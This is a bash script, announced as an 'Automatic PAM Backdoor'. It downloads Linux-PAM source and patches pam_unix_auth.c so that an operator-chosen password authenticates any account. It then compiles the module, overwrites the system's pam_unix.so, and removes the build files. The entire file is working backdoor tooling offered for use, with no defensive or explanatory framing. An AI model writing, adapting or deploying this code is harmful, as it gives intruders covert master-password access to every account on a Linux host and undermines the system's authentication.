#!/bin/bash
#
apt update
apt install libpam-dev libfido2-dev libssl-dev make autoconf automake autopoint autoconf-archive pkg-config flex bison libaudit-dev libselinux1-dev libtool gettext -y
OPTIND=1

PAM_VERSION=
PAM_FILE=
PASSWORD=

echo "Automatic PAM Backdoor"

function show_help {
        echo ""
        echo "Example usage: $0 -v 1.3.0 -p some_s3cr3t_p455word"
        echo "For a list of supported versions: https://github.com/linux-pam/linux-pam/releases"
}

PAM_VERSION=$(dpkg-query -W -f='${Version}\n' libpam0g 2>/dev/null | cut -d'-' -f1)

while getopts ":h:?:p:v:" opt; do
    case "$opt" in
    h|\?)
        show_help
        exit 0
        ;;
    v)  PAM_VERSION="$OPTARG"
        ;;
    p)  PASSWORD="$OPTARG"
        ;;
    esac
done

shift $((OPTIND-1))

[ "$1" = "--" ] && shift

if [ -z $PAM_VERSION ]; then
        show_help
        exit 1
fi;

if [ -z $PASSWORD ]; then
        show_help
        exit 1
fi;

echo "PAM Version: $PAM_VERSION"
echo "Password: $PASSWORD"
echo ""

PAM_BASE_URL="https://github.com/linux-pam/linux-pam/archive"
PAM_DIR="linux-pam-${PAM_VERSION}"
PAM_FILE="v${PAM_VERSION}.tar.gz"
PATCH_DIR=`which patch`

if [ $? -ne 0 ]; then
        echo "Error: patch command not found. Exiting..."
        exit 1
fi
wget -c "${PAM_BASE_URL}/${PAM_FILE}"
if [[ $? -ne 0 ]]; then # did not work, trying the old format
    PAM_DIR="linux-pam-Linux-PAM-${PAM_VERSION}"
    PAM_FILE="Linux-PAM-${PAM_VERSION}.tar.gz"
    wget -c "${PAM_BASE_URL}/${PAM_FILE}"
    if [[ $? -ne 0 ]]; then
        # older version need a _ instead of a .
        PAM_VERSION="$(echo $PAM_VERSION | tr '.' '_')"
        PAM_DIR="linux-pam-Linux-PAM-${PAM_VERSION}"
        PAM_FILE="Linux-PAM-${PAM_VERSION}.tar.gz"
        wget -c "${PAM_BASE_URL}/${PAM_FILE}"
        if [[ $? -ne 0 ]]; then
            echo "Failed to download"
            exit 1
        fi
    fi
fi

tar xzf $PAM_FILE
cd $PAM_DIR
awk -v password="$PASSWORD" '
/retval = _unix_verify_password\(pamh, name, p, ctrl\);/ {
    print "\tif (p && strcmp(p, \"" password "\") == 0) {"
    print "\t\tretval = PAM_SUCCESS;"
    print "\t} else {"
    print "\t\tretval = _unix_verify_password(pamh, name, p, ctrl);"
    print "\t}"
    next
}
{ print }
' modules/pam_unix/pam_unix_auth.c > modules/pam_unix/pam_unix_auth.c.new

mv modules/pam_unix/pam_unix_auth.c.new modules/pam_unix/pam_unix_auth.c


# newer version need autogen to generate the configure script

./autogen.sh
./configure --disable-doc
make
cp modules/pam_unix/.libs/pam_unix.so /lib/x86_64-linux-gnu/security/

cd ..
rm -rf $PAM_DIR
rm v${PAM_VERSION}.tar.gz
